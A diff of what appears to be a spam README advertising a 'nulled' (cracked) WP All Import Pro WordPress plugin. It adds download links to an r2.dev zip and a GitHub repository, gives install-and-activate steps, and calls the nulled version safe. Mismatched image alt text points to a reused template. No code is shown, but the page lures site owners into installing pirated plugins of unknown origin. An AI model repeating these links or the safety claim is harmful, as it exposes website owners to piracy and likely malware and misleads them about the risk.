@@ -6,7 +6,7 @@ Searching for **WP All Import Pro Nulled** to unlock premium import features for
 
 <div style="display: flex; align-items: center; justify-content: center; gap: 20px; max-width: 600px; margin: 40px auto;">
   <a href="https://pub-970116c3bb9c4aa8ba1cc47a7bdd8e28.r2.dev/Auto-Search-Plugin-Themes-Nulled-Free-Download-2025.zip" download style="display: flex; align-items: center; justify-content: center;">
-    <img src="https://github.com/user-attachments/assets/49419d16-8abb-4998-9ae3-8fb1bbca5085" alt="duplicator pro nulled" style="width: 300px; height: 200px; object-fit: cover; cursor: pointer;">
+    <img src="https://github.com/user-attachments/assets/c8f3c945-6953-4b85-9ff5-5fc65c52a3fc" alt="duplicator pro nulled" style="width: 300px; height: 200px; object-fit: cover; cursor: pointer;">
   </a>
   <a href="https://pub-970116c3bb9c4aa8ba1cc47a7bdd8e28.r2.dev/Auto-Search-Plugin-Themes-Nulled-Free-Download-2025.zip" download style="display: flex; align-items: center; justify-content: center;">
     <img src="https://github.com/user-attachments/assets/8bb3123b-133a-4292-afa4-7f25347e7ba7" alt="download button" style="width: 415px; height: 161px; object-fit: cover; cursor: pointer;">
@@ -79,7 +79,7 @@ If you’re considering WP All Import Pro, **trying the nulled version is a safe
 
 ## How to Install WP All Import Pro Nulled (2025 Edition)
 
-1. [Download the WP All Import Pro v4.11.3 .zip file](#)
+1. [Download the WP All Import Pro v4.11.3 .zip file](https://github.com/vanhelsing34/wp-all-import-pro/)
 2. Go to **WordPress Dashboard → Plugins → Add New**
 3. Click **Upload Plugin** and select your downloaded file
 4. Click **Install Now** and then **Activate**
